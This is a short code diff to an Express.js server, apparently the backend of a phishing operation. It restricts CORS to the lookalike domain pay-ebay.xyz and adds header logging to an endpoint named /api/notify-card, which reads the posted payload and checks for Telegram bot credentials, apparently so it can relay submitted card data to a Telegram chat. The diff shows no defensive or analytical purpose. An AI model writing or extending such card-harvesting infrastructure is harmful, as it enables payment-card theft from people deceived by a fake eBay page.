@@ -21,11 +21,25 @@ app.use(
 app.use(express.json());
 
 // Handle all OPTIONS requests with CORS
-app.options("*", cors());
+app.options("*", (req, res) => {
+  console.log("Received OPTIONS request to:", req.url);
+  console.log("Request headers:", req.headers);
+  cors({
+    origin: ["https://www.pay-ebay.xyz"],
+    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
+    allowedHeaders: ["Content-Type", "Authorization"],
+    credentials: true,
+  })(req, res, () => {
+    res.status(200).end();
+  });
+});
 
 app.get("/health", (_req, res) => res.json({ ok: true }));
 
 app.post("/api/notify-card", async (req, res) => {
+  console.log("Received POST request to /api/notify-card");
+  console.log("Request headers:", req.headers);
+  console.log("Request URL:", req.url);
   try {
     const payload = req.body || {};
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
